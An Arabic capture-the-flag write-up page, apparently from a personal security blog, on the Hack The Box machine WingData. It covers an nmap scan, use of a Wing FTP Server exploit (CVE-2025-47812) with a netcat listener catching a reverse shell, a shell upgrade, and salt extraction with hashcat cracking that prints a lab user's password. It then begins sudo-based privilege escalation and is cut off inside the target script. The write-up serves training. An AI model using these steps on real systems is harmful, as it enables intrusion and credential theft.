@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#07110d">
+  <meta name="color-scheme" content="dark light">
+  <meta name="description" content="تقرير CTF تقني لتحدي WingData على منصة Hack The Box.">
+  <title>WingData | Ft7y.Sec</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="icon" href="../avatar.png" type="image/png">
+</head>
+<body>
+  <a class="skip-link" href="#main-content">تخطي إلى المحتوى</a>
+  <div class="scroll-progress" id="scroll-progress" aria-hidden="true"></div>
+  <div class="page-noise" aria-hidden="true"></div>
+  <canvas id="particles-canvas"></canvas>
+  <header class="navbar" id="navbar">
+    <div class="logo"><a href="../index.html#home">Ft7y<span>.Sec</span></a></div>
+    <nav class="nav-links" id="nav-menu" aria-label="التنقل الرئيسي"><ul>
+      <li><a href="../index.html#home">الرئيسية</a></li>
+      <li><a href="../pentest.html">اختبار الاختراق</a></li>
+      <li><a href="../appsec.html">أمن التطبيقات</a></li>
+      <li><a href="../automation.html">البرمجة والأتمتة</a></li>
+      <li><a href="../systems-labs.html">الأنظمة والمعامل</a></li>
+      <li><a href="../writeups.html">CTF Write-ups</a></li>
+      <li><a href="../index.html#contact">تواصل معي</a></li>
+    </ul></nav>
+    <div class="nav-actions">
+      <button id="theme-toggle" class="btn-secondary" type="button" title="تبديل الوضع" aria-label="تبديل الوضع"><i class="fa-solid fa-moon"></i></button>
+      <button class="mobile-toggle" id="mobile-toggle" type="button" aria-label="القائمة"><i class="fa-solid fa-bars"></i></button>
+    </div>
+  </header>
+  <main id="main-content" class="subpage-container ctf-report-page">
+    <article class="ctf-report-article">
+      <header class="subpage-hero ctf-report-hero" data-aos="fade-up">
+        <nav class="breadcrumb-nav" aria-label="مسار التنقل"><a href="../index.html"><i class="fa-solid fa-house"></i> الرئيسية</a><span class="sep">/</span><a href="index.html">تقارير CTF</a><span class="sep">/</span><span class="current">WingData</span></nav>
+        <div class="writeup-header"><span class="platform-tag htb"><i class="fa-solid fa-cube"></i> Hack The Box</span><span class="ctf-directory-label"><i class="fa-solid fa-shield-halved"></i> بيئة تدريبية مصرح بها</span></div>
+        <h1 class="subpage-hero-title">WingData</h1>
+        <p class="subpage-hero-desc">توثيق تقني محفوظ من المصدر الأصلي في Notion، يشمل الخطوات والأوامر والنتائج ولقطات الشاشة المتاحة.</p>
+        <a href="index.html" class="btn-outline ctf-back-link"><i class="fa-solid fa-arrow-right"></i> العودة إلى تقارير CTF</a>
+      </header>
+      <div class="ctf-report-content" data-aos="fade-up"><h2>بسم الله الرحمن الرحيم</h2><h4><strong>first : enumeration </strong></h4><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-1.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>sudo nmap -A 10.129.49.142
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-07 13:18 +0300
+Nmap scan report for 10.129.49.142
+Host is up (0.16s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey: 
+|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
+|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
+80/tcp open  http    Apache httpd 2.4.66
+|_http-server-header: Apache/2.4.66 (Debian)
+|_http-title: Did not follow redirect to http://wingdata.htb/
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (88%)
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%), Linux 4.15 (90%), OpenWrt 21.02 (Linux 5.4) (90%), Linux 2.6.32 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 22/tcp)
+HOP RTT       ADDRESS
+1   186.45 ms 10.10.16.1
+2   252.90 ms 10.129.49.142
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.80 seconds</code></pre></section><p>&gt; <strong>I added the address to the hosts file and visit site   قمت باضافة العنوان الى ملف  المضيفين وزيارة الموقع من المتصفح</strong></p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>echo &quot; 10.129.49.142 wingdata.htb&quot; | sudo tee -a /etc/hosts</code></pre></section><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-2.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-3.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-4.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><p>عند زيارة  <strong>client portal</strong> في الصفحة الرئيسية نجد خادم محلي داخلي على  <strong>ftp.wingdata.htb</strong> لكن لا يمكنك زيارته الا اذا اضفت العنوان الى ملف المضيفين اسفل العنوان الاخر</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>ecoh &quot;10.129.49.142 ftp.wingdata.htb&quot; | sudo tee -a /etc/hosts</code></pre></section><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-5.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><p>بعد البحث عن wing FTP Serveer v7.4.3 تجد انه مصاب بثغرة  *<em>CVE-2025-47812  تجد POC الخاص بها هنا</em><strong><em>&lt;mention-page url=&quot;https://app.notion.com/p/3597739eb41280488d6de8d21098179f&quot;/&gt;</em></strong><em> </em>*</p><p>قم بوضع الكود داخل ملف <a href="http://exploit.py" target="_blank" rel="noopener noreferrer">exploit.py</a>  وقم بحفظه بعد ذلك قم بتنفيذه كما يلي :</p><p>اولا افتح <strong>netcat</strong>   في نافذه منفصلة وانتظر الاتصال</p><p>&lt;columns&gt;</p><p>&lt;column ratio=&quot;56.25&quot;&gt;</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>pythhon3 exploit.py -u http://ftp.wingdata.htb -c &quot;whoami&quot;
+</code></pre></section><p>&lt;/column&gt;</p><p>&lt;column ratio=&quot;43.75&quot;&gt;</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>┌──(kali㉿kali)-[~/Downloads]
+└─$ nc -lvnp 9001
+listening on [any] 9001 ...
+</code></pre></section><p>&lt;/column&gt;</p><p>&lt;/columns&gt;</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-6.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><h4>الان تم الاستغلال بنجاح وستجد الاتصال في نافذة   <strong>nc</strong></h4><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-7.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><h4><strong>بمجرد الدخول، قمنا بالاستقرار (Stabilizing the shell):</strong></h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+wingftp@wingdata:/opt/wftpserver$
+wingftp@wingdata:/opt/wftpserver$ ls -la  
+total 26504
+drwxr-x---  9 wingftp wingftp     4096 May  7 06:16 .
+drwxr-xr-x  4 root    root        4096 Feb  9 08:19 ..
+drwxr-x---  4 wingftp wingftp     4096 May  7 06:16 Data
+-rwxr-x---  1 wingftp wingftp     4834 Jul 31  2018 License.txt
+drwxr-x---  5 wingftp wingftp     4096 May  7 08:52 Log
+drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 lua
+-rw-r--r--  1 wingftp wingftp        5 May  7 06:16 pid-wftpserver.pid
+-rwxr-x---  1 wingftp wingftp     1434 Sep 13  2020 README
+drwxr-x---  2 wingftp wingftp     4096 May  7 08:56 session
+drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 session_admin
+-rwxr-x---  1 wingftp wingftp   115258 Mar 26  2025 version.txt
+drwxr-x--- 10 wingftp wingftp    12288 Feb  9 08:19 webadmin
+drwxr-x--- 13 wingftp wingftp     4096 Feb  9 08:19 webclient
+-rwxr-x---  1 wingftp wingftp  4649509 Sep 14  2021 wftpconsole
+-rwxr-x---  1 wingftp wingftp     3272 Nov  2  2025 wftp_default_ssh.key
+-rwxr-x---  1 wingftp wingftp     1342 Nov 22  2017 wftp_default_ssl.crt
+-rwxr-x---  1 wingftp wingftp     1675 Nov 22  2017 wftp_default_ssl.key
+-rwxr-x---  1 wingftp wingftp 22283682 Mar 26  2025 wftpserver
+wingftp@wingdata:/opt/wftpserver$
+</code></pre></section><p><strong>لقد وجدت ملف Data/settings.xml يحتوي على كلمة مرور مشفرة للخادم: 2D35A8D420A697203D7C554A678F8119</strong></p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-8.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><p><strong>تعرفنا على اسلوب التشفير الخاص بها وهو MD5 ولمكن لم نتمكن من اختراقها ولكن وجدنا بعض المعلومات الاخرى المهمة </strong></p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-9.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><aside class="ctf-callout"><p><strong><code dir="ltr">&lt;Password&gt;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca&lt;/Password&gt;</code></strong></p></aside><p><strong>بعد التعمق في البحث عن المعلومات الخاصة بالخادم wing FTP Server  تجد ان   الخادم لا يقوم بتخزين قيمة الهاش الخاص بكلمة السر فقط بل يضيف عليها قيمة اضافية افتراضية تسمى  </strong><strong>salt&lt;br&gt;قم بالبحث عن salt الافتراضي الذي يقوم الخادم باضافته  تجده داخل ملف settings.xml</strong></p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>wingftp@wingdata:/opt/wftpserver/Data/1$ ls
+ls
+groups  portlistener.xml  settings.xml  users
+wingftp@wingdata:/opt/wftpserver/Data/1$ cat settings.xml
+cat settings.xml
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;DOMAIN_OPTION Description=&quot;Wing FTP Server Domain settings&quot;&gt;
+    &lt;Domain_Max_Session&gt;0&lt;/Domain_Max_Session&gt;
+    &lt;Domain_Per_Ip_Max_Session&gt;0&lt;/Domain_Per_Ip_Max_Session&gt;
+    &lt;Per_Session_Max_Download_Speed&gt;0&lt;/Per_Session_Max_Download_Speed&gt;
+    &lt;Per_Session_Max_Upload_Speed&gt;0&lt;/Per_Session_Max_Upload_Speed&gt;
+    &lt;Domain_Max_Download_Speed&gt;0&lt;/Domain_Max_Download_Speed&gt;
+    &lt;Domain_Max_Upload_Speed&gt;0&lt;/Domain_Max_Upload_Speed&gt;
+    &lt;Per_User_Max_Download_Speed&gt;0&lt;/Per_User_Max_Download_Speed&gt;
+    &lt;Per_User_Max_Upload_Speed&gt;0&lt;/Per_User_Max_Upload_Speed&gt;
+    &lt;Passive_Type&gt;0&lt;/Passive_Type&gt;
+    &lt;Pasv_Ip_Refresh_Interval&gt;60&lt;/Pasv_Ip_Refresh_Interval&gt;
+    &lt;Fixed_Ip&gt;&lt;/Fixed_Ip&gt;
+    &lt;Web_Ip&gt;http://ip.wftpserver.com/w/getIP.php&lt;/Web_Ip&gt;
+    &lt;DNS_Ip&gt;&lt;/DNS_Ip&gt;
+    &lt;Enable_UPnP_For_Passive_Ports&gt;0&lt;/Enable_UPnP_For_Passive_Ports&gt;
+    &lt;Min_Passive_Port&gt;1024&lt;/Min_Passive_Port&gt;
+    &lt;Max_Passive_Port&gt;1124&lt;/Max_Passive_Port&gt;
+    &lt;Transfer_Buffer_Size&gt;65535&lt;/Transfer_Buffer_Size&gt;
+    &lt;Userdata_Access_Style&gt;1&lt;/Userdata_Access_Style&gt;
+    &lt;MYSQL_Address&gt;localhost&lt;/MYSQL_Address&gt;
+    &lt;MYSQL_Port&gt;3306&lt;/MYSQL_Port&gt;
+    &lt;MYSQL_Username&gt;root&lt;/MYSQL_Username&gt;
+    &lt;MYSQL_Password&gt;&lt;/MYSQL_Password&gt;
+    &lt;MYSQL_DatabaseName&gt;wftp_database&lt;/MYSQL_DatabaseName&gt;
+    &lt;MYSQL_UnixSocket&gt;&lt;/MYSQL_UnixSocket&gt;
+    &lt;ODBC_DSN_Address&gt;&lt;/ODBC_DSN_Address&gt;
+    &lt;ODBC_DSN_Username&gt;&lt;/ODBC_DSN_Username&gt;
+    &lt;ODBC_DSN_Password&gt;&lt;/ODBC_DSN_Password&gt;
+    &lt;Enable_Mode_Z_support&gt;0&lt;/Enable_Mode_Z_support&gt;
+    &lt;Default_Compression_level&gt;8&lt;/Default_Compression_level&gt;
+    &lt;Min_Compression_level&gt;1&lt;/Min_Compression_level&gt;
+    &lt;Max_Compression_level&gt;9&lt;/Max_Compression_level&gt;
+    &lt;Enable_SFV_Check&gt;0&lt;/Enable_SFV_Check&gt;
+    &lt;SFV_Check_Create_Missing&gt;0&lt;/SFV_Check_Create_Missing&gt;
+    &lt;SFV_Check_Bad_File&gt;0&lt;/SFV_Check_Bad_File&gt;
+    &lt;SFV_Check_Create_Progress&gt;0&lt;/SFV_Check_Create_Progress&gt;
+    &lt;SFV_Check_Send_Result&gt;0&lt;/SFV_Check_Send_Result&gt;
+    &lt;Anti_Hammer_Enable&gt;1&lt;/Anti_Hammer_Enable&gt;
+    &lt;Anti_Hammer_Block_Time&gt;180&lt;/Anti_Hammer_Block_Time&gt;
+    &lt;Anti_Hammer_Login_Failed_Counts&gt;10&lt;/Anti_Hammer_Login_Failed_Counts&gt;
+    &lt;Anti_Hammer_Interval&gt;90&lt;/Anti_Hammer_Interval&gt;
+    &lt;Anti_Hammer_Send_Message&gt;0&lt;/Anti_Hammer_Send_Message&gt;
+    &lt;SSL_Name&gt;wftp_default_ssl&lt;/SSL_Name&gt;
+    &lt;SSH_Name&gt;wftp_default_ssh&lt;/SSH_Name&gt;
+    &lt;SSH_Use_UTF8&gt;1&lt;/SSH_Use_UTF8&gt;
+    &lt;SMTP_Name&gt;&lt;/SMTP_Name&gt;
+    &lt;Enable_FXP&gt;0&lt;/Enable_FXP&gt;
+    &lt;Enable_WebLink&gt;0&lt;/Enable_WebLink&gt;
+    &lt;Enable_Logfile&gt;1&lt;/Enable_Logfile&gt;
+    &lt;Logfile_Name&gt;%Y-%M-%D.log&lt;/Logfile_Name&gt;
+    &lt;Logfile_Maxsize&gt;512000&lt;/Logfile_Maxsize&gt;
+  
+    &lt;LDAP_Enable_FileAppend&gt;0&lt;/LDAP_Enable_FileAppend&gt;
+    &lt;LDAP_Enable_FileDelete&gt;0&lt;/LDAP_Enable_FileDelete&gt;
+    &lt;LDAP_Enable_DirRename&gt;0&lt;/LDAP_Enable_DirRename&gt;
+    &lt;LDAP_Enable_DirList&gt;1&lt;/LDAP_Enable_DirList&gt;
+    &lt;LDAP_Enable_DirCreate&gt;0&lt;/LDAP_Enable_DirCreate&gt;
+    &lt;LDAP_Enable_DirDelete&gt;0&lt;/LDAP_Enable_DirDelete&gt;
+    &lt;LDAP_Enable_FileRename&gt;0&lt;/LDAP_Enable_FileRename&gt;
+    &lt;LDAP_Enable_ZipFile&gt;0&lt;/LDAP_Enable_ZipFile&gt;
+    &lt;LDAP_Enable_UnzipFile&gt;0&lt;/LDAP_Enable_UnzipFile&gt;
+    &lt;LDAP_User_Mapping&gt;LDAPUser001:LocalUser001&amp;#x0A;LDAPUser002:LocalUser002&lt;/LDAP_User_Mapping&gt;
+    &lt;LDAP_Group_Mapping&gt;CN=ADGroup1,CN=Builtin,DC=wftpserver,DC=com:LocalUser1&amp;#x0A;CN=ADGroup2,CN=Builtin,DC=wftpserver,DC=com:LocalUser2&lt;/LDAP_Group_Mapping&gt;
+    &lt;LDAP_Version&gt;3&lt;/LDAP_Version&gt;
+    &lt;LDAP_Dir_Lowercase&gt;0&lt;/LDAP_Dir_Lowercase&gt;
+    &lt;WebLink_Speed&gt;0&lt;/WebLink_Speed&gt;
+    &lt;LIST_TIME_GMT&gt;1&lt;/LIST_TIME_GMT&gt;
+    &lt;Logfile_Compress&gt;1&lt;/Logfile_Compress&gt;
+    &lt;Enable_UTF8_ON&gt;1&lt;/Enable_UTF8_ON&gt;
+    &lt;Enable_AUTH_ON&gt;1&lt;/Enable_AUTH_ON&gt;
+    &lt;Use_LANIP_For_LAN_Client_Passive&gt;1&lt;/Use_LANIP_For_LAN_Client_Passive&gt;
+    &lt;Min_Password_Length&gt;0&lt;/Min_Password_Length&gt;
+    &lt;Password_Have_Numerals&gt;0&lt;/Password_Have_Numerals&gt;
+    &lt;Password_Have_Lowercase&gt;0&lt;/Password_Have_Lowercase&gt;
+    &lt;Password_Have_Uppercase&gt;0&lt;/Password_Have_Uppercase&gt;
+    &lt;Password_Have_Nonalphanumeric&gt;0&lt;/Password_Have_Nonalphanumeric&gt;
+    &lt;Enable_NTFS_Permission&gt;0&lt;/Enable_NTFS_Permission&gt;
+    &lt;EnableSHA256&gt;1&lt;/EnableSHA256&gt;
+    &lt;Enable_HTTPS_Redirect&gt;0&lt;/Enable_HTTPS_Redirect&gt;
+    &lt;HTTPS_Redirect_Port&gt;443&lt;/HTTPS_Redirect_Port&gt;
+    &lt;Change_Password_Firstlogon&gt;0&lt;/Change_Password_Firstlogon&gt;
+    &lt;Enable_UploadLink&gt;0&lt;/Enable_UploadLink&gt;
+    &lt;UploadLink_Speed&gt;0&lt;/UploadLink_Speed&gt;
+    &lt;Additional_HTTP_Headers&gt;&lt;/Additional_HTTP_Headers&gt;
+    &lt;Allow_Passive_Active_Mode&gt;2&lt;/Allow_Passive_Active_Mode&gt;
+    &lt;Passive_Listener_Timeout&gt;30&lt;/Passive_Listener_Timeout&gt;
+    &lt;Auto_Passive_Port_Forward&gt;0&lt;/Auto_Passive_Port_Forward&gt;
+    &lt;MYSQL_Set_UTF8&gt;1&lt;/MYSQL_Set_UTF8&gt;
+    &lt;Enable_Domain&gt;1&lt;/Enable_Domain&gt;
+    &lt;Auto_Active_Port_Forward&gt;0&lt;/Auto_Active_Port_Forward&gt;
+    &lt;Weblink_URL&gt;&lt;/Weblink_URL&gt;
+    &lt;Enable_Symbolic_Link&gt;0&lt;/Enable_Symbolic_Link&gt;
+    &lt;Enable_Welcome_Message&gt;0&lt;/Enable_Welcome_Message&gt;
+    &lt;Welcome_Message&gt;&lt;/Welcome_Message&gt;
+    &lt;Keep_Old_Weblink&gt;0&lt;/Keep_Old_Weblink&gt;
+    &lt;Uplink_Overwrite_File&gt;0&lt;/Uplink_Overwrite_File&gt;
+    &lt;SSH_Banner&gt;WingFTPServer&lt;/SSH_Banner&gt;
+    &lt;HTTP_KeepAlive&gt;1&lt;/HTTP_KeepAlive&gt;
+    &lt;Enable_Weblink_Subfolder&gt;0&lt;/Enable_Weblink_Subfolder&gt;
+    &lt;TLS_Session_Timeout&gt;3600&lt;/TLS_Session_Timeout&gt;
+    &lt;EnablePasswordSalting&gt;1&lt;/EnablePasswordSalting&gt;
+    &lt;SaltingString&gt;WingFTP&lt;/SaltingString&gt;
+    &lt;Enable_Log_Millisecond&gt;0&lt;/Enable_Log_Millisecond&gt;
+    &lt;LDAP_Mapping_CaseInsensitive&gt;0&lt;/LDAP_Mapping_CaseInsensitive&gt;
+    &lt;LDAP_Timeout&gt;10&lt;/LDAP_Timeout&gt;
+    &lt;Keep_Anonymous_Weblink&gt;0&lt;/Keep_Anonymous_Weblink&gt;
+    &lt;Transfer_Limit&gt;
+        &lt;Transfer_Limit_Enable&gt;0&lt;/Transfer_Limit_Enable&gt;
+        &lt;Transfer_Limit_Reset&gt;0&lt;/Transfer_Limit_Reset&gt;
+        &lt;Transfer_Limit_Reset_Time&gt;0&lt;/Transfer_Limit_Reset_Time&gt;
+        &lt;Enable_Upload_Limit_Never&gt;0&lt;/Enable_Upload_Limit_Never&gt;
+        &lt;Current_Upload_Size_Never&gt;0&lt;/Current_Upload_Size_Never&gt;
+        &lt;Max_Upload_Size_Never&gt;0&lt;/Max_Upload_Size_Never&gt;
+        &lt;Enable_Download_Limit_Never&gt;0&lt;/Enable_Download_Limit_Never&gt;
+        &lt;Current_Download_Size_Never&gt;0&lt;/Current_Download_Size_Never&gt;
+        &lt;Max_Download_Size_Never&gt;0&lt;/Max_Download_Size_Never&gt;
+        &lt;Enable_Upload_Limit_Hourly&gt;0&lt;/Enable_Upload_Limit_Hourly&gt;
+        &lt;Current_Upload_Size_Hourly&gt;0&lt;/Current_Upload_Size_Hourly&gt;
+        &lt;Max_Upload_Size_Hourly&gt;0&lt;/Max_Upload_Size_Hourly&gt;
+        &lt;Enable_Download_Limit_Hourly&gt;0&lt;/Enable_Download_Limit_Hourly&gt;
+&lt;/DOMAIN_OPTION&gt;
+wingftp@wingdata:/opt/wftpserver/Data/1$</code></pre></section><p>السطر الذي نريده هو  <strong>\&lt;SaltingString\&gt;WingFTP\&lt;/SaltingString\&gt;</strong></p><p>قم بوضع الهاش + salt  في ملف وسميه hash</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-10.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><p><strong>نفذ الامر التالي : </strong></p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>┌──(kali㉿kali)-[~/Downloads]
+└─$ hashcat -m 1410 -a 0 hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, 4196/8456 MB (2048 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimim salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1410 (sha256($pass.$salt))
+Hash.Target......: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b87...ingFTP
+Time.Started.....: Thu May  7 23:29:44 2026 (5 secs)
+Time.Estimated...: Thu May  7 23:29:49 2026 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  2631.4 kH/s (1.00ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 14344192/14344385 (100.00%)
+Rejected.........: 0/14344192 (0.00%)
+Restore.Point....: 14336000/14344385 (99.94%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: #!hottie -&gt;  ladykitz
+Hardware.Mon.#1..: Util: 37%
+
+Started: Thu May  7 23:29:22 2026
+Stopped: Thu May  7 23:29:50 2026
+                                                                                             
+┌──(kali㉿kali)-[~/Downloads]</code></pre></section><p>وكدة تبق حصلت على كلمة مرور المستخدم wacky  دلوقتي هنسجل دخول باستخدام ال Username = <strong>wacky</strong> Password =  *<em>!#7Blushing\^\</em>Bride5  <em><strong><em>هنسجل بيهم</em></strong></em>    ssh**</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/wingdata-11.png" alt="لقطة شاشة من تقرير WingData" loading="lazy"><figcaption>لقطة شاشة من تقرير WingData</figcaption></figure><p>وكدة تكون حصلت على<strong> User Flag </strong></p><h3><strong> Next step :    Privilege escalation</strong></h3><p>&gt;  الامر <strong>sudo -L </strong> بين وجود اسكريبت شغال بصلاحية ال <strong>Root</strong>  بدون باسورد هنفتحه ونحاول نشوف   بيشتغل ازاي وهل نقدر نستغله</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>wacky@wingdata:~$ sudo -l
+Matching Defaults entries for wacky on wingdata:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
+wacky@wingdata:~$</code></pre></section><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>wacky@wingdata:~$ cat /opt/backup_clients/restore_backup_clients.py
+#!/usr/bin/env python3
+import tarfile
+import os
+import sys
+import re
+import argparse
+
+BACKUP_BASE_DIR = &quot;/opt/backup_clients/backups&quot;
+STAGING_BASE = &quot;/opt/backup_clients/restored_backups&quot;
+
+def validate_backup_name(filename):
+    if not re.fullmatch(r&quot;^backup_\d+\.tar$&quot;, filename):
+        return False
+    client_id = filename.split(&#39;_&#39;)[1].rstrip(&#39;.tar&#39;)
